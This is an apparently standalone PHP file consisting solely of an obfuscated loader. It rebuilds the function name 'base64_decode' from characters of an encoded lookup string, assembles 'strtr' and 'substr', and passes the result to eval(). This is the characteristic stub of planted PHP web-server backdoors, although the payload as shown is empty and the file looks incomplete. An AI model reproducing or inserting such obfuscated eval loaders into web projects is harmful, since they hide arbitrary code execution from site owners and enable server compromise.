<?php define('UMgSMg0323',__FILE__);$hshAzo=base64_decode("bjF6Yi9tYTVcdnQwaTI4LXB4dXF5KjZscmtkZzlfZWhjc3dvNCtmMzdqUUZBbGp4YllMZ25lWGRCcGtjTmhSeWl3ZlVFclRKREdPbVB0S29Wc2FXSHpDU011cUl2Wg==");$hZayXI=$hshAzo[3].$hshAzo[6].$hshAzo[33].$hshAzo[30];$YVGqDE=$hshAzo[33].$hshAzo[10].$hshAzo[24].$hshAzo[10].$hshAzo[24];$OOtsUk=$YVGqDE[0].$hshAzo[18].$hshAzo[3].$YVGqDE[0].$YVGqDE[1].$hshAzo[24];$LjLmlC=$hshAzo[7].$hshAzo[13];$hZayXI.=$hshAzo[22].$hshAzo[36].$hshAzo[29].$hshAzo[26].$hshAzo[30].$hshAzo[32].$hshAzo[35].$hshAzo[26].$hshAzo[30];eval($hZayXI(""));?>